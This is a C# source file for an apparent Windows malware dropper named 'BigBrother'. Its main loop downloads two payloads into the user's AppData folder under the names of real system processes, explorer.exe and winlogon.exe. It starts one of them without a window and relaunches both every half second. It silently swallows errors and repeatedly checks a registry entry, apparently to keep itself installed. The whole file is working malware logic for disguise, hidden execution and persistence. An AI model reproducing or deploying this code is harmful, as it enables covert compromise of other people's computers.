using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;

using svchost;

namespace BigBrother
{
    class Program
    {
        static RegistryManager RegistryManager = new RegistryManager();
        static BrotherManager BrotherManager = new BrotherManager();
        static SpookyManager SpookyManager = new SpookyManager();

        static void Main(string[] args)
        {
            string BrotherPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows"); // Define the folder
            string BrotherName = "explorer.exe";

            string SpookyPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows");
            string SpookyName = "winlogon.exe";

            while (Thread.CurrentThread.IsAlive) // Play as looping ;D
            {
                try
                {
                    if (!BrotherManager.BrotherExists(Path.Combine(BrotherPath, BrotherName)))
                        BrotherManager.DownloadBrother(BrotherPath, BrotherName);

                    if (!SpookyManager.SpookyExists(Path.Combine(SpookyPath, SpookyName)))
                        SpookyManager.DownloadSpooky(SpookyPath, SpookyName);

                    if (!BrotherIsOpen(Path.Combine(BrotherPath, BrotherName))) // Launch the brother
                    {
                        Process _Brother = new Process();

                        _Brother.StartInfo.FileName = Path.Combine(BrotherPath, BrotherName);
                        _Brother.StartInfo.WorkingDirectory = BrotherPath;
                        _Brother.StartInfo.CreateNoWindow = true;
                        _Brother.Start();
                    }

                    if (!SpookyIsOpen(Path.Combine(SpookyPath, SpookyName)))
                    {
                        Process _Spooky = new Process();

                        _Spooky.StartInfo.FileName = Path.Combine(SpookyPath, SpookyName);
                        _Spooky.StartInfo.WorkingDirectory = SpookyPath;
                        _Spooky.Start();
                    }
                }
                catch
                {
                    // Please don't crash the application :D
                }

                RegistryManager.CheckRegistry();

                Thread.Sleep(500);
            }
        }

        private static bool BrotherIsOpen(string Path)
        {
            FileStream _FStream;

            try
            {
                _FStream = File.Open(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
                _FStream.Close();
                return false;
            }
            catch
            {
                _FStream = null;
                return true;
            }
        }

        private static bool SpookyIsOpen(string Path)
        {
            FileStream _FStream;

            try
            {
                _FStream = File.Open(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
                _FStream.Close();
                return false;
            }
            catch
            {
                _FStream = null;
                return true;
            }
        }
    }
}
